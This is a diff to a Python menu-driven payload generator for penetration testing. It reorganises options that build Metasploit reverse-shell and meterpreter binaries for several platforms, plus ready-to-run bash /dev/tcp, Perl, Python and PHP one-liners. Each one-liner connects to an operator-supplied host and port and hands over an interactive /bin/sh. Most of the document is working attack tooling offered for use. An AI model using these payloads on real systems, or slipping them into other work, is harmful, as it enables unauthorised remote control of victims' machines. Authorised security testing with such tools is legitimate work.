@@ -19,6 +19,8 @@ parser = argparse.ArgumentParser(description='Build shellcode for multiple platf
 
 parser.add_argument('host', help='Host to use for the shellcode', nargs='?', default="127.0.0.1", type=str)
 parser.add_argument('port', help='Port to use for the shellcode', nargs='?', default=1234, type=int)
+parser.add_argument('--php_filename', help='php filename to save as', default='php-reverse-shell.php', type=str)
+parser.add_argument('--msf_file_basename', help='msf filename to save as', default='shell', type=str)
 
 args = parser.parse_args()
 
@@ -37,7 +39,7 @@ def msf_generate(payload):
 
 
 def php_file_pentestmonkey(payload=None):
-    filename = "php-reverse-shell.php"
+    filename = args.php_filename
     dir = getcwd()
     fin = open(dir + "/php-reverse-shell-template.php")
     fout = open(filename, "wt")
@@ -65,25 +67,129 @@ def oneliner(payload):
 
 payloads = [
     {
-        'title': 'MSF Reverse Shells',
+        'title': 'Reverse Shells',
         'generate_title': 'Select a payload to generate',
         'function': {'function_name': msf_generate},
         'submenu': [
-            {'payload': "linux/x86/meterpreter/reverse_tcp", 'format': 'elf', 'filename': 'shell.elf'},
-            {'payload': "linux/x64/shell/reverse_tcp", 'format': 'elf', 'filename': 'shell64.elf'},
-            {'payload': "windows/meterpreter/reverse_nonx_tcp", 'format': 'exe', 'filename': 'shell.exe'},
-            {'payload': "windows/x64/meterpreter/reverse_tcp", 'format': 'exe', 'filename': 'shell64.exe'},
-            {'payload': "osx/x86/shell_reverse_tcp", 'format': 'macho', 'filename': 'shell.dmg'},
-            {'payload': "osx/x64/shell_reverse_tcp", 'format': 'macho', 'filename': 'shell64.dmg'},
-            {'payload': "php/meterpreter/reverse_tcp", 'format': 'raw', 'filename': 'shell.php'},
-            {'payload': "python/meterpreter/reverse_tcp", 'format': 'raw', 'filename': 'shell.py'},
-            {'payload': "java/jsp_shell_reverse_tcp", 'format': 'raw', 'filename': 'shell.jsp'},
-            {'payload': "java/jsp_shell_reverse_tcp", 'format': 'war', 'filename': 'shell.war'},
-            {'payload': "java/meterpreter/reverse_tcp", 'format': 'raw', 'filename': 'shell.war'},
-            {'payload': "cmd/unix/reverse_bash", 'format': 'raw', 'filename': 'shell.sh'},
-            {'payload': "cmd/windows/powershell_reverse_tcp", 'format': 'ps1', 'filename': 'shell.ps1'},
-            {'payload': "windows/meterpreter/reverse_http", 'format': 'exe', 'filename': 'shell.exe'},
-            {'payload': "windows/meterpreter/reverse_https", 'format': 'exe', 'filename': 'shell.exe'},
+            {
+                "title": "",
+                "payload": "linux/x86/meterpreter/reverse_tcp",
+                "format": "elf",
+                "filename": args.msf_file_basename + ".elf"
+            },
+            {
+                "title": "",
+                "payload": "linux/x64/shell/reverse_tcp",
+                "format": "elf",
+                "filename": args.msf_file_basename + "_64.elf"
+            },
+            {
+                "title": "",
+                "payload": "windows/meterpreter/reverse_nonx_tcp",
+                "format": "exe",
+                "filename": args.msf_file_basename + ".exe"
+            },
+            {
+                "title": "",
+                "payload": "windows/x64/meterpreter/reverse_tcp",
+                "format": "exe",
+                "filename": args.msf_file_basename + "_64.exe"
+            },
+            {
+                "title": "",
+                "payload": "osx/x86/shell_reverse_tcp",
+                "format": "macho",
+                "filename": args.msf_file_basename + ".dmg"
+            },
+            {
+                "title": "",
+                "payload": "osx/x64/shell_reverse_tcp",
+                "format": "macho",
+                "filename": args.msf_file_basename + "_64.dmg"
+            },
+            {
+                "title": "",
+                "payload": "php/meterpreter/reverse_tcp",
+                "format": "raw",
+                "filename": args.msf_file_basename + ".php"
+            },
+            {
+                "title": "",
+                "payload": "python/meterpreter/reverse_tcp",
+                "format": "raw",
+                "filename": args.msf_file_basename + ".py"
+            },
+            {
+                "title": "",
+                "payload": "java/jsp_shell_reverse_tcp",
+                "format": "raw",
+                "filename": args.msf_file_basename + ".jsp"
+            },
+            {
+                "title": "",
+                "payload": "java/jsp_shell_reverse_tcp",
+                "format": "war",
+                "filename": args.msf_file_basename + ".war"
+            },
+            {
+                "title": "",
+                "payload": "java/meterpreter/reverse_tcp",
+                "format": "raw",
+                "filename": args.msf_file_basename + ".war"
+            },
+            {
+                "title": "",
+                "payload": "cmd/unix/reverse_bash",
+                "format": "raw",
+                "filename": args.msf_file_basename + ".sh"
+            },
+            {
+                "title": "",
+                "payload": "cmd/windows/powershell_reverse_tcp",
+                "format": "ps1",
+                "filename": args.msf_file_basename + ".ps1"
+            },
+            {
+                "title": "",
+                "payload": "windows/meterpreter/reverse_http",
+                "format": "exe",
+                "filename": args.msf_file_basename + ".exe"
+            },
+            {
+                "title": "",
+                "payload": "windows/meterpreter/reverse_https",
+                "format": "exe",
+                "filename": args.msf_file_basename + ".exe"
+            },
+            {
+                'title': 'Bash Oneliner',
+                'payload': 'bash -i >& /dev/tcp/{host}/{port} 0>&1'.format(host=args.host, port=args.port),
+                'function': {'function_name': oneliner}
+            },
+            {
+                'title': 'Perl Oneliner',
+                'payload': 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % (
+                    args.host, args.port),
+                'function': {'function_name': oneliner}
+            },
+            {
+                'title': 'Python Oneliner',
+                'payload': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''.format(
+                    host=args.host, port=args.port),
+                'function': {'function_name': oneliner}
+            },
+            {
+                'title': 'PHP Oneliner',
+                'payload': 'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''.format(
+                    host=args.host, port=args.port),
+                'function': {'function_name': oneliner}
+            },
+            {
+                'title': 'PHP Oneliner V2',
+                'payload': 'php -r \'$sock = fsockopen("{host}",{port}); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); \''.format(
+                    host=args.host, port=args.port),
+                'function': {'function_name': oneliner}
+            },
         ]
     },
     {
@@ -91,32 +197,26 @@ payloads = [
         'generate_title': 'Select a TTY to generate',
         'function': {'function_name': oneliner},
         'submenu': [
-            {'payload': 'python -c \'import pty; pty.spawn("/bin/sh")\''},
-            {'payload': 'python -c \'import pty; pty.spawn("/bin/bash")\''},
-            {'payload': 'echo os.system(\'/bin/bash\')'},
-            {'payload': '/bin/sh -i'},
-            {'payload': 'perl: exec "/bin/sh";'},
-        ]
-    },
-    {
-        'title': 'One liners',
-        'generate_title': 'Select a One liner to generate',
-        'function': {'function_name': oneliner},
-        'submenu': [
-            {'payload': 'bash -i >& /dev/tcp/{host}/{port} 0>&1'.format(host=args.host, port=args.port)},
             {
-                'payload': 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % (
-                    args.host, args.port)
+                'title': '',
+                'payload': 'python -c \'import pty; pty.spawn("/bin/sh")\''
             },
             {
-                'payload': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''.format(
-                    host=args.host, port=args.port)
+                'title': '',
+                'payload': 'python -c \'import pty; pty.spawn("/bin/bash")\''
             },
-            {'payload': 'php -r \'$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''.format(
-                host=args.host, port=args.port)},
             {
-                'payload': 'php -r \'$sock = fsockopen("{host}",{port}); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); \''.format(
-                    host=args.host, port=args.port)},
+                'title': '',
+                'payload': 'echo os.system(\'/bin/bash\')'
+            },
+            {
+                'title': '',
+                'payload': '/bin/sh -i'
+            },
+            {
+                'title': '',
+                'payload': 'perl: exec "/bin/sh";'
+            },
         ]
     },
     {
@@ -124,7 +224,11 @@ payloads = [
         'generate_title': 'Select a PHP Code to generate',
         'function': {'function_name': None},
         'submenu': [
-            {'payload': 'Generate PHP file pentest monkey', 'function': {'function_name': php_file_pentestmonkey}},
+            {
+                'title': '',
+                'payload': 'Generate PHP file pentest monkey',
+                'function': {'function_name': php_file_pentestmonkey}
+            },
         ]
     },
 ]
@@ -188,7 +292,10 @@ def footer(menu_items):
 def handle_payloads(item):
     print(item['generate_title'])
     for index, value in enumerate(item['submenu']):
-        print(str(index) + ": " + value['payload'])
+        if value['title'] != '':
+            print(str(index) + ": " + value['title'])
+        else:
+            print(str(index) + ": " + value['payload'])
     footer_text()
     selected = input("Please select an option: ")
     if selected == "00" or selected == "99":
@@ -201,13 +308,14 @@ def handle_payloads(item):
     try:
         if selected_payload is None:
             raise
-        # try main function that is defined
-        if item['function'] is not None and item['function']['function_name'] is not None:
-            item['function']['function_name'](selected_payload)
-            return
         # try function on individual items
-        elif selected_payload['function'] is not None and selected_payload['function']['function_name'] is not None:
-            selected_payload['function']['function_name']()
+        if 'function' in selected_payload and selected_payload['function'] is not None \
+                and selected_payload['function']['function_name'] is not None:
+            selected_payload['function']['function_name'](selected_payload)
+            return
+        # try main function that is defined fallback to main function
+        elif 'function' in item and item['function'] is not None and item['function']['function_name'] is not None:
+            item['function']['function_name'](selected_payload)
             return
         return
     except ValueError as e:
